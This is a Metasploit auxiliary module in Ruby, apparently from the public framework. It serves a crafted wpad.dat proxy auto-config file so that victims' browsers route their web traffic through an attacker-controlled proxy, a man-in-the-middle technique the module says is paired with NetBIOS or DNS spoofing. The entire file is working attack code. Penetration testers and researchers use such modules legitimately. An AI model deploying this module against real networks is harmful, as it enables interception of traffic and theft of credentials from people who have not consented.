##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WPAD.dat File Server',
      'Description' => %q{
          This module generates a valid wpad.dat file for WPAD mitm
        attacks. Usually this module is used in combination with DNS attacks
        or the 'NetBIOS Name Service Spoofer' module. Please remember as the
        server will be running by default on TCP port 80 you will need the
        required privileges to open that port.
      },
      'Author'      =>
        [
          'et'            # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'SRVPORT' => 80
        },
      'Passive' => true))

    register_options(
      [
        OptAddress.new('EXCLUDENETWORK', [ true, "Network to exclude",'127.0.0.1' ]),
        OptAddress.new('EXCLUDENETMASK', [ true, "Netmask to exclude",'255.255.255.0' ]),
        OptAddress.new('PROXY', [ true, "Proxy to redirect traffic to", '0.0.0.0' ]),
        OptPort.new('PROXYPORT',[ true, "Proxy port", 8080 ])
      ])

    deregister_options('URIPATH')
  end


  def on_request_uri(cli, request)
    vprint_status("Request '#{request.method} #{request.headers['user-agent']}")

    return send_not_found(cli) if request.method == "POST"

    html = <<-EOS
function FindProxyForURL(url, host) {
      // URLs within this network are accessed directly
      if (isInNet(host, "#{datastore['EXCLUDENETWORK']}", "#{datastore['EXCLUDENETMASK']}"))
      {
         return "DIRECT";
      }
      return "PROXY #{datastore['PROXY']}:#{datastore['PROXYPORT']}; DIRECT";
   }
EOS

    print_status("Sending WPAD config")
    send_response_html(cli, html,
      {
        'Content-Type' => 'application/x-ns-proxy-autoconfig'
      })
  end

  def resource_uri
    "/wpad.dat"
  end

  def primer
    hardcoded_uripath("/proxy.pac")
  end

  def run
    # This should probably be added to the Http mixin's run method
    begin
      exploit
    rescue Errno::EACCES => e
      if e.message =~ /Permission denied - bind/
        print_error("You need to have permission to bind to #{datastore['SRVPORT']}")
      else
        raise e
      end
    end
  end
end

